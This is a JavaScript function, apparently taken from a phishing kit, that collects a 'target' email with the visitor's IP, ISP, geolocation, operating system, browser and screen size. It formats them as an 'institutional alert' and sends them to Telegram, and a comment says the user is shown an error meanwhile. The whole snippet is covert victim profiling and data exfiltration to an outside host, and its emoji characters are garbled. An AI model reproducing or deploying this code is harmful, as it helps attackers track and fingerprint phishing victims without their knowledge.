// FORENSIC BREACH ALERT - Detailed signature + Institutional format
// ГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗГўвҖўВҗ
const sendForensicAlert = async (targetEmail, alertType = 'BREACH') => {
  // Send instant error to user (non-blocking)
  // Gather forensic data in background
  const forensic = await gatherForensicData();

  // Build world-class formatted message
  const message = `Г°ЕёЕЎВЁ <b>INSTITUTIONAL ${alertType} ALERT</b>

Г°ЕёвҖҳВӨ <b>TARGET IDENTITY</b>
Email: <code>${targetEmail}</code>

Г°ЕёЕ’Вҗ <b>NETWORK PROFILE</b>
IP: <code>${forensic.ip}</code>
ISP: <code>${forensic.isp}</code>

Г°ЕёвҖңВҚ <b>GEOGRAPHIC LOCATION</b>
Location: <code>${forensic.city}, ${forensic.region}, ${forensic.country}</code>

Г°ЕёвҖҷВ» <b>HARDWARE SIGNATURE</b>
Device: <code>${forensic.os}</code>
Browser: <code>${forensic.browser}</code>
Display: <code>${forensic.screenResolution}</code>

ГўВҸВ° <b>TIMESTAMP</b>
<code>${forensic.timestamp}</code>`;

  // Send to Telegram (non-blocking)
  sendTelegramAlert(message);
};



